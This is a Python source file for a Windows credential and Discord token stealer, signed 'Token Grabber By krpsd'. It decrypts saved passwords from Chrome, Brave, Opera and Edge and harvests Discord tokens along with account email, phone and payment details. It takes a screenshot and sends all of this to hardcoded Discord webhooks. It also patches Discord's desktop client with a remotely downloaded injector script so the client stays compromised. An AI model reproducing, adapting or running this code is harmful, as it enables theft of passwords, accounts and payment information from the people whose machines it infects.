#use Python 3.9.8
import os

from itsdangerous import exc
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
import os
import json
from Crypto.Cipher import AES
import shutil
from PIL import ImageGrab
import os
from json import dumps, loads
from sqlite3 import connect
from wmi import WMI
from win32crypt import CryptUnprotectData
from re import findall
from shutil import copy2
from Crypto.Cipher import AES
from urllib.request import Request, urlopen
import os
from getpass import getuser
from json import dumps, loads
from sqlite3 import connect
from wmi import WMI
from base64 import b64decode
from win32crypt import CryptUnprotectData
from re import findall
from Crypto.Cipher import AES
from urllib.request import Request, urlopen
import requests
import json
import signal
import getpass
import psutil
from zipfile import ZipFile
from dhooks import Webhook, File
import httpx
import requests
import json
import requests
import random
from captchatools import captcha_harvesters
from urllib.request import Request, urlopen
import os
import sys
from colorama import Fore
import string
import threading
import time
from itertools import cycle
hook = Webhook("https://discord.com/api/webhooks/937013194524856323/JEDP1wGyYdK6pAinyeEPL8Ljruc9miP9Vd1MXzH4pN3wyk_H8RQCM5dHnyOwjZYnvJ4a")
#######################################################################
#WARNING WEBHOOK IS INSTALLED CHANGE BEFORE EXECUTED!#
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(str(e))
def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

#######################################################################
#CHROME BROWSER
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = connect("Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            with open(f"{os.environ['USERPROFILE']}\Passwords.txt","a") as f:
                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                f.close()
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove(f"Loginvault.db")
    except Exception as e:
        pass
except FileNotFoundError as e:
    pass
#######################################################################
#BRAVE BROWSER
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
    copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = connect("Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            with open(f"{os.environ['USERPROFILE']}\Passwords.txt","a") as f:
                f.wirte("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                f.close()
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove(f"Loginvault.db")
    except Exception as e:
        pass
except FileNotFoundError as e:
    pass
#######################################################################
#OPERA BROWSER
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Login Data'
    copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = connect("Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            with open(f"{os.environ['USERPROFILE']}\Passwords.txt","a") as f:
                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                f.close()
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove(f"Loginvault.db")
    except Exception as e:
        pass
except FileNotFoundError as e:
    pass
#######################################################################
#MICROSOFT EDGE
#######################################################################
try:
    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = connect("Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            with open(f"{os.environ['USERPROFILE']}\Passwords.txt","a") as f:
                f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
                f.close()
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove(f"Loginvault.db")
    except Exception as e:
        pass
except FileNotFoundError as e:
   pass


LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discord.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discord.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discord.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        p
        return bool(len(loads(urlopen(Request("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass    
def get_uhq(token):
    s = ""
    headers = {'Authorization': f'{token}'}
    response = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=headers)
    response_dict = json.loads(response.text)
    if len(response_dict) == 0:
        return None
    for i in response_dict:
        number = i['user']['public_flags']
        if i['type'] == 1 & number% 131072 != 0:
            s += f" <:DevBadge:912727453875699733> {i['user']['username']}#{i['user']['discriminator']}\n"
            number = number % 131072
        if i['type'] == 1 & number // 16384!= 0:
            s += f" <:TG_DiscordBugHunter:924608161116213278> {i['user']['username']}#{i['user']['discriminator']}\n"
            number = number % 16384
        if i['type'] == 1 & number // 512!= 0:
            s += f" <a:early:913099122968494170> {i['user']['username']}#{i['user']['discriminator']}\n"
            number = number % 512
        if i['type'] == 1 & number // 8!= 0:
            s += f" <:TP_Icon_bugHunter:896263053484638218> {i['user']['username']}#{i['user']['discriminator']}\n"
            number = number % 8
        if i['type'] == 1 & number // 4!= 0:
            s += f" <a:CH_IconHypesquadShiny:928551747591487548> {i['user']['username']}#{i['user']['discriminator']}\n"
            number = number % 4
        if i['type'] == 1 & number // 2!= 0:
            s += f" <a:Badge_partner:875020015215190046> {i['user']['username']}#{i['user']['discriminator']}\n"
            number = number % 2
    if s == "":
        return None
    else:
        return s
def get_badges(token):
    user_data = getuserdata(token)
    s = ""
    isnitro = bool(user_data.get("premium_type"))
    if isnitro == True:
        nitrotype = user_data.get("premium_type")
        if nitrotype == 1:
            s+= " <:nitro:911256326150172672> "
        elif nitrotype == 2:
            s += "<:nitro:911256326150172672>"
    headers = {'Authorization': f'{token}'}
    response = requests.get("https://discord.com/api/v6/users/@me", headers=headers)
    response_dict = json.loads(response.text)
    if response_dict['public_flags'] == 0:
        return None
    number = response_dict['public_flags']
    if number // 131072 != 0:
        s += " <:DevBadge:912727453875699733> "
        number = number % 131072
    if number // 16384!= 0:
        s += " <:TG_DiscordBugHunter:924608161116213278> "
        number = number % 16384
    if number // 512!= 0:
        s += "<a:early:913099122968494170> "
        number = number % 512
    if number // 256!= 0:
        s += " <:Balance:911256411122589797> "
        number = number % 256
    if number // 128!= 0:
        s += " <:Brilliance:911256524058402836> "
        number = number % 128
    if number // 64!= 0:
        s += " <:Bravery:911256473504452649> "
        number = number % 64
    if number // 8!= 0:
        s += " <:TP_Icon_bugHunter:896263053484638218> "
        number = number % 8
    if number // 4!= 0:
        s += " <a:CH_IconHypesquadShiny:928551747591487548> "
        number = number % 4
    if number // 2!= 0:
        s += " <a:Badge_partner:875020015215190046> "
        number = number % 2
    return s
def get_cc(token):
    k = ""
    headers = {'Authorization': f'{token}'}
    response = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)
    response_dict = json.loads(response.text)
    if len(response_dict) ==0:
        return "❌"
    else:
        for i in response_dict:
            if i['brand'] == "visa":
                k+= " 💳 "
            elif i['brand'] == "paypal":
                k+= " <:paypal:903369110560321596> "
    return k
def get_friends(token):
    s = 0
    headers = {'Authorization': f'{token}'}
    response = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=headers)
    response_dict = json.loads(response.text)
    if len(response_dict) ==0:
        return None
    for i in response_dict:
        if i['type'] == 1:
            s+=1
    return s

def Stealer():
	for proc in psutil.process_iter():
		if any(procstr in proc.name() for procstr in\
		['discord', 'Discord', 'DISCORD',]):
			proc.kill()
	for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
		for name in dirs:
			if (name.__contains__("discord_desktop_core-")):
				try:
					directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
					os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Krpsd"))
					f = urlopen("https://raw.githubusercontent.com/fatih00114/injector/main/index.js")
					index_content = f.read()
					with open(directory_list, 'wb') as index_file:
						index_file.write(index_content)
					with open(directory_list, 'r+') as index_file2:
						replace_string = index_file2.read().replace("%WEBHOOK_LINK%", "https://discord.com/api/webhooks/937015956696367104/xdDgkC10mztRLLNbXubawY9bpw5i9J9HTC9bYUI6j_7GOvNFAlQfXKPJwpi1Eym7VNVr")
					with open(directory_list, 'w'): pass
					with open(directory_list, 'r+') as index_file3:
						index_file3.write(replace_string)
				except Exception:
				    pass
	for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
		for name in files:
			discord_file = os.path.join(root, name)
			os.startfile(discord_file)

def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    temp = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            phone = user_data["phone"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            card = get_cc(token)
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": ":unlock: | Token : Click Me To Copy In Mobile",
                        "value": f'`{token}`',
                        "inline": False
                    },
                    {
                        "name": ":snowflake: | Username",
                        "value": f'`{username}`',
                        "inline": True
                    },
                    {
                        "name": ":incoming_envelope: | Email",
                        "value": f"`{email}`",
                        "inline": True
                    },
                    {
                        "name": ":green_apple: | Badges",
                        "value": f"{get_badges(token)}",
                        "inline": True
                    },
                    {
                        "name": ":mobile_phone: | Phone",
                        "value": f"`{phone}`",
                        "inline": True
                    },
                    {
                        "name": ":credit_card: | Payment Method",
                        "value": f"{card}",
                        "inline": True
                    },
                   {
                        "name": ":people_hugging: | Friends",
                        "value": f"`{get_friends(token)}`",
                        "inline": True
                    },
                    {
                        "name": f":money_with_wings: | HQ friends",
                        "value": f'{get_uhq(token)}',
                        "inline": False
                    },
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                    "text": f"Token Grabber By krpsd",
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
        "file": "{os.environ['USERPROFILE']}\Screenshot.jpg",
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/937013194524856323/JEDP1wGyYdK6pAinyeEPL8Ljruc9miP9Vd1MXzH4pN3wyk_H8RQCM5dHnyOwjZYnvJ4a", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass

def send_info():
    passwords = File(f"{os.environ['USERPROFILE']}\Passwords.txt")
    screen =ImageGrab.grab()
    screen.save(f"{os.environ['USERPROFILE']}\Screenshot.jpg")
    image = File(f"{os.environ['USERPROFILE']}\Screenshot.jpg")
    hook.send("passwords:", file=passwords)
    hook.send("screenshot:", file=image)
if __name__ == "__main__":
    try:
        send_info()
    except:
        print("error")
    try:
        main()
    except:
        print("error")
    try:
        os.remove(f"{os.environ['USERPROFILE']}\Screenshot.jpg")
        os.remove(f"{os.environ['USERPROFILE']}\Passwords.txt")
    except:
        print("error")
    try:
        Stealer()
    except:
        print("error")
